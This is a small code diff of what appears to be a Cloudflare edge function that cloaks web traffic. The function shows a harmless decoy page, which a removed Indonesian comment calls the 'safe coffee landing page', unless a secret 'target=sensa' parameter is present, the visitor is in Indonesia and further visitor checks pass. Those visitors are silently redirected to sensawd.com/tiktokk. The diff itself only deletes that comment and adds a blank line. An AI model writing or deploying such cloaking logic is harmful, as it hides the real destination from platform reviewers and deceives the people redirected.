@@ -6,7 +6,7 @@ export async function onRequest(context) {
   const asOrganization = request.cf ? request.cf.asOrganization : '';
   const targetKey = url.searchParams.get('target');
   if (targetKey !== 'sensa') {
-    return next(); // Jika kunci salah/tidak ada, tampilkan LP Kopi aman
+    return next();
   }
   if (country !== 'ID') {
     return next();
@@ -25,4 +25,5 @@ export async function onRequest(context) {
     return next();
   }
   return Response.redirect("https://sensawd.com/tiktokk", 302);
+
 }
